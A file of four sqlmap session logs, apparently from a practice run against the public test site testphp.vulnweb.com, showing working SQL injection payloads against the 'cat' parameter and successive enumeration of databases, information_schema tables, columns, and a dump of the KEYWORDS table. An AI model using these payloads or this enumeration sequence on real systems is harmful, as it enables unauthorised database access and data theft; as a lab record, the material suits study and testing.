@@ -1,0 +1,528 @@
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.6.4#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:43:42 /2022-09-28/
+
+[12:43:42] [INFO] resuming back-end DBMS 'mysql' 
+[12:43:42] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=1 AND 1852=1852
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: cat=1 AND GTID_SUBSET(CONCAT(0x716b627a71,(SELECT (ELT(6550=6550,1))),0x717a7a7671),6550)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)
+    Payload: cat=1 OR (SELECT 8557 FROM (SELECT(SLEEP(5)))Lxmt)#
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: cat=1 UNION ALL SELECT CONCAT(0x716b627a71,0x7871457965687455524e796c694d695a544a6e596d6f6f734a70425549534c6a7674595966674f4d,0x717a7a7671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+---
+[12:43:43] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40, Nginx 1.19.0
+back-end DBMS: MySQL >= 5.6
+[12:43:43] [INFO] fetching database names
+available databases [2]:
+[*] acuart
+[*] information_schema
+
+[12:43:43] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/testphp.vulnweb.com'
+
+[*] ending @ 12:43:43 /2022-09-28/
+
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.6.4#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:44:18 /2022-09-28/
+
+[12:44:18] [INFO] resuming back-end DBMS 'mysql' 
+[12:44:18] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=1 AND 1852=1852
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: cat=1 AND GTID_SUBSET(CONCAT(0x716b627a71,(SELECT (ELT(6550=6550,1))),0x717a7a7671),6550)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)
+    Payload: cat=1 OR (SELECT 8557 FROM (SELECT(SLEEP(5)))Lxmt)#
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: cat=1 UNION ALL SELECT CONCAT(0x716b627a71,0x7871457965687455524e796c694d695a544a6e596d6f6f734a70425549534c6a7674595966674f4d,0x717a7a7671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+---
+[12:44:18] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40, Nginx 1.19.0
+back-end DBMS: MySQL >= 5.6
+[12:44:18] [INFO] fetching tables for database: 'information_schema'
+Database: information_schema
+[79 tables]
++---------------------------------------+
+| ADMINISTRABLE_ROLE_AUTHORIZATIONS     |
+| APPLICABLE_ROLES                      |
+| CHARACTER_SETS                        |
+| CHECK_CONSTRAINTS                     |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMNS                               |
+| COLUMNS_EXTENSIONS                    |
+| COLUMN_PRIVILEGES                     |
+| COLUMN_STATISTICS                     |
+| ENABLED_ROLES                         |
+| ENGINES                               |
+| EVENTS                                |
+| FILES                                 |
+| INNODB_BUFFER_PAGE                    |
+| INNODB_BUFFER_PAGE_LRU                |
+| INNODB_BUFFER_POOL_STATS              |
+| INNODB_CACHED_INDEXES                 |
+| INNODB_CMP                            |
+| INNODB_CMPMEM                         |
+| INNODB_CMPMEM_RESET                   |
+| INNODB_CMP_PER_INDEX                  |
+| INNODB_CMP_PER_INDEX_RESET            |
+| INNODB_CMP_RESET                      |
+| INNODB_COLUMNS                        |
+| INNODB_DATAFILES                      |
+| INNODB_FIELDS                         |
+| INNODB_FOREIGN                        |
+| INNODB_FOREIGN_COLS                   |
+| INNODB_FT_BEING_DELETED               |
+| INNODB_FT_CONFIG                      |
+| INNODB_FT_DEFAULT_STOPWORD            |
+| INNODB_FT_DELETED                     |
+| INNODB_FT_INDEX_CACHE                 |
+| INNODB_FT_INDEX_TABLE                 |
+| INNODB_INDEXES                        |
+| INNODB_METRICS                        |
+| INNODB_SESSION_TEMP_TABLESPACES       |
+| INNODB_TABLES                         |
+| INNODB_TABLESPACES                    |
+| INNODB_TABLESPACES_BRIEF              |
+| INNODB_TABLESTATS                     |
+| INNODB_TEMP_TABLE_INFO                |
+| INNODB_TRX                            |
+| INNODB_VIRTUAL                        |
+| KEYWORDS                              |
+| KEY_COLUMN_USAGE                      |
+| OPTIMIZER_TRACE                       |
+| PARAMETERS                            |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| RESOURCE_GROUPS                       |
+| ROLE_COLUMN_GRANTS                    |
+| ROLE_ROUTINE_GRANTS                   |
+| ROLE_TABLE_GRANTS                     |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMATA_EXTENSIONS                   |
+| SCHEMA_PRIVILEGES                     |
+| STATISTICS                            |
+| ST_GEOMETRY_COLUMNS                   |
+| ST_SPATIAL_REFERENCE_SYSTEMS          |
+| ST_UNITS_OF_MEASURE                   |
+| TABLES                                |
+| TABLESPACES                           |
+| TABLESPACES_EXTENSIONS                |
+| TABLES_EXTENSIONS                     |
+| TABLE_CONSTRAINTS                     |
+| TABLE_CONSTRAINTS_EXTENSIONS          |
+| TABLE_PRIVILEGES                      |
+| TRIGGERS                              |
+| USER_ATTRIBUTES                       |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
+| VIEW_ROUTINE_USAGE                    |
+| VIEW_TABLE_USAGE                      |
++---------------------------------------+
+
+[12:44:18] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/testphp.vulnweb.com'
+
+[*] ending @ 12:44:18 /2022-09-28/
+
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.6.4#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:44:47 /2022-09-28/
+
+[12:44:47] [INFO] resuming back-end DBMS 'mysql' 
+[12:44:47] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=1 AND 1852=1852
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: cat=1 AND GTID_SUBSET(CONCAT(0x716b627a71,(SELECT (ELT(6550=6550,1))),0x717a7a7671),6550)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)
+    Payload: cat=1 OR (SELECT 8557 FROM (SELECT(SLEEP(5)))Lxmt)#
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: cat=1 UNION ALL SELECT CONCAT(0x716b627a71,0x7871457965687455524e796c694d695a544a6e596d6f6f734a70425549534c6a7674595966674f4d,0x717a7a7671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+---
+[12:44:47] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.19.0, PHP 5.6.40
+back-end DBMS: MySQL >= 5.6
+[12:44:47] [INFO] fetching columns for table 'KEYWORDS' in database 'information_schema'
+Database: information_schema
+Table: KEYWORDS
+[2 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| RESERVED | int         |
+| WORD     | varchar(31) |
++----------+-------------+
+
+[12:44:47] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/testphp.vulnweb.com'
+
+[*] ending @ 12:44:47 /2022-09-28/
+
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.6.4#stable}
+|_ -| . [.]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:45:06 /2022-09-28/
+
+[12:45:07] [INFO] resuming back-end DBMS 'mysql' 
+[12:45:07] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=1 AND 1852=1852
+
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: cat=1 AND GTID_SUBSET(CONCAT(0x716b627a71,(SELECT (ELT(6550=6550,1))),0x717a7a7671),6550)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)
+    Payload: cat=1 OR (SELECT 8557 FROM (SELECT(SLEEP(5)))Lxmt)#
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 11 columns
+    Payload: cat=1 UNION ALL SELECT CONCAT(0x716b627a71,0x7871457965687455524e796c694d695a544a6e596d6f6f734a70425549534c6a7674595966674f4d,0x717a7a7671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+---
+[12:45:07] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.19.0, PHP 5.6.40
+back-end DBMS: MySQL >= 5.6
+[12:45:07] [INFO] fetching entries of column(s) 'WORD' for table 'KEYWORDS' in database 'information_schema'
+Database: information_schema
+Table: KEYWORDS
+[710 entries]
++---------------------------------+
+| WORD                            |
++---------------------------------+
+[12:45:08] [WARNING] console output will be trimmed to last 256 rows due to large table size
+| PROCESS                         |
+| PROCESSLIST                     |
+| PROFILE                         |
+| PROFILES                        |
+| PROXY                           |
+| PURGE                           |
+| QUARTER                         |
+| QUERY                           |
+| QUICK                           |
+| RANDOM                          |
+| RANGE                           |
+| RANK                            |
+| READ                            |
+| READS                           |
+| READ_ONLY                       |
+| READ_WRITE                      |
+| REAL                            |
+| REBUILD                         |
+| RECOVER                         |
+| RECURSIVE                       |
+| REDO_BUFFER_SIZE                |
+| REDUNDANT                       |
+| REFERENCE                       |
+| REFERENCES                      |
+| REGEXP                          |
+| RELAY                           |
+| RELAYLOG                        |
+| RELAY_LOG_FILE                  |
+| RELAY_LOG_POS                   |
+| RELAY_THREAD                    |
+| RELEASE                         |
+| RELOAD                          |
+| REMOVE                          |
+| RENAME                          |
+| REORGANIZE                      |
+| REPAIR                          |
+| REPEAT                          |
+| REPEATABLE                      |
+| REPLACE                         |
+| REPLICA                         |
+| REPLICAS                        |
+| REPLICATE_DO_DB                 |
+| REPLICATE_DO_TABLE              |
+| REPLICATE_IGNORE_DB             |
+| REPLICATE_IGNORE_TABLE          |
+| REPLICATE_REWRITE_DB            |
+| REPLICATE_WILD_DO_TABLE         |
+| REPLICATE_WILD_IGNORE_TABLE     |
+| REPLICATION                     |
+| REQUIRE                         |
+| REQUIRE_ROW_FORMAT              |
+| REQUIRE_TABLE_PRIMARY_KEY_CHECK |
+| RESET                           |
+| RESIGNAL                        |
+| RESOURCE                        |
+| RESPECT                         |
+| RESTART                         |
+| RESTORE                         |
+| RESTRICT                        |
+| RESUME                          |
+| RETAIN                          |
+| RETURN                          |
+| RETURNED_SQLSTATE               |
+| RETURNING                       |
+| RETURNS                         |
+| REUSE                           |
+| REVERSE                         |
+| REVOKE                          |
+| RIGHT                           |
+| RLIKE                           |
+| ROLE                            |
+| ROLLBACK                        |
+| ROLLUP                          |
+| ROTATE                          |
+| ROUTINE                         |
+| ROW                             |
+| ROWS                            |
+| ROW_COUNT                       |
+| ROW_FORMAT                      |
+| ROW_NUMBER                      |
+| RTREE                           |
+| SAVEPOINT                       |
+| SCHEDULE                        |
+| SCHEMA                          |
+| SCHEMAS                         |
+| SCHEMA_NAME                     |
+| SECOND                          |
+| SECONDARY                       |
+| SECONDARY_ENGINE                |
+| SECONDARY_ENGINE_ATTRIBUTE      |
+| SECONDARY_LOAD                  |
+| SECONDARY_UNLOAD                |
+| SECOND_MICROSECOND              |
+| SECURITY                        |
+| SELECT                          |
+| SENSITIVE                       |
+| SEPARATOR                       |
+| SERIAL                          |
+| SERIALIZABLE                    |
+| SERVER                          |
+| SESSION                         |
+| SET                             |
+| SHARE                           |
+| SHOW                            |
+| SHUTDOWN                        |
+| SIGNAL                          |
+| SIGNED                          |
+| SIMPLE                          |
+| SKIP                            |
+| SLAVE                           |
+| SLOW                            |
+| SMALLINT                        |
+| SNAPSHOT                        |
+| SOCKET                          |
+| SOME                            |
+| SONAME                          |
+| SOUNDS                          |
+| SOURCE                          |
+| SOURCE_CONNECTION_AUTO_FAILOVER |
+| SPATIAL                         |
+| SPECIFIC                        |
+| SQL                             |
+| SQLEXCEPTION                    |
+| SQLSTATE                        |
+| SQLWARNING                      |
+| SQL_AFTER_GTIDS                 |
+| SQL_AFTER_MTS_GAPS              |
+| SQL_BEFORE_GTIDS                |
+| SQL_BIG_RESULT                  |
+| SQL_BUFFER_RESULT               |
+| SQL_CALC_FOUND_ROWS             |
+| SQL_NO_CACHE                    |
+| SQL_SMALL_RESULT                |
+| SQL_THREAD                      |
+| SQL_TSI_DAY                     |
+| SQL_TSI_HOUR                    |
+| SQL_TSI_MINUTE                  |
+| SQL_TSI_MONTH                   |
+| SQL_TSI_QUARTER                 |
+| SQL_TSI_SECOND                  |
+| SQL_TSI_WEEK                    |
+| SQL_TSI_YEAR                    |
+| SRID                            |
+| SSL                             |
+| STACKED                         |
+| START                           |
+| STARTING                        |
+| STARTS                          |
+| STATS_AUTO_RECALC               |
+| STATS_PERSISTENT                |
+| STATS_SAMPLE_PAGES              |
+| STATUS                          |
+| STOP                            |
+| STORAGE                         |
+| STORED                          |
+| STRAIGHT_JOIN                   |
+| STREAM                          |
+| STRING                          |
+| SUBCLASS_ORIGIN                 |
+| SUBJECT                         |
+| SUBPARTITION                    |
+| SUBPARTITIONS                   |
+| SUPER                           |
+| SUSPEND                         |
+| SWAPS                           |
+| SWITCHES                        |
+| SYSTEM                          |
+| TABLE                           |
+| TABLES                          |
+| TABLESPACE                      |
+| TABLE_CHECKSUM                  |
+| TABLE_NAME                      |
+| TEMPORARY                       |
+| TEMPTABLE                       |
+| TERMINATED                      |
+| TEXT                            |
+| THAN                            |
+| THEN                            |
+| THREAD_PRIORITY                 |
+| TIES                            |
+| TIME                            |
+| TIMESTAMP                       |
+| TIMESTAMPADD                    |
+| TIMESTAMPDIFF                   |
+| TINYBLOB                        |
+| TINYINT                         |
+| TINYTEXT                        |
+| TLS                             |
+| TO                              |
+| TRAILING                        |
+| TRANSACTION                     |
+| TRIGGER                         |
+| TRIGGERS                        |
+| TRUE                            |
+| TRUNCATE                        |
+| TYPE                            |
+| TYPES                           |
+| UNBOUNDED                       |
+| UNCOMMITTED                     |
+| UNDEFINED                       |
+| UNDO                            |
+| UNDOFILE                        |
+| UNDO_BUFFER_SIZE                |
+| UNICODE                         |
+| UNINSTALL                       |
+| UNION                           |
+| UNIQUE                          |
+| UNKNOWN                         |
+| UNLOCK                          |
+| UNSIGNED                        |
+| UNTIL                           |
+| UPDATE                          |
+| UPGRADE                         |
+| USAGE                           |
+| USE                             |
+| USER                            |
+| USER_RESOURCES                  |
+| USE_FRM                         |
+| USING                           |
+| UTC_DATE                        |
+| UTC_TIME                        |
+| UTC_TIMESTAMP                   |
+| VALIDATION                      |
+| VALUE                           |
+| VALUES                          |
+| VARBINARY                       |
+| VARCHAR                         |
+| VARCHARACTER                    |
+| VARIABLES                       |
+| VARYING                         |
+| VCPU                            |
+| VIEW                            |
+| VIRTUAL                         |
+| VISIBLE                         |
+| WAIT                            |
+| WARNINGS                        |
+| WEEK                            |
+| WEIGHT_STRING                   |
+| WHEN                            |
+| WHERE                           |
+| WHILE                           |
+| WINDOW                          |
+| WITH                            |
+| WITHOUT                         |
+| WORK                            |
+| WRAPPER                         |
+| WRITE                           |
+| X509                            |
+| XA                              |
+| XID                             |
+| XML                             |
+| XOR                             |
+| YEAR                            |
+| YEAR_MONTH                      |
+| ZEROFILL                        |
+| ZONE                            |
++---------------------------------+
+
+[12:45:08] [INFO] table 'information_schema.KEYWORDS' dumped to CSV file '/home/kali/.local/share/sqlmap/output/testphp.vulnweb.com/dump/information_schema/KEYWORDS.csv'
+[12:45:08] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/testphp.vulnweb.com'
+
+[*] ending @ 12:45:08 /2022-09-28/
+
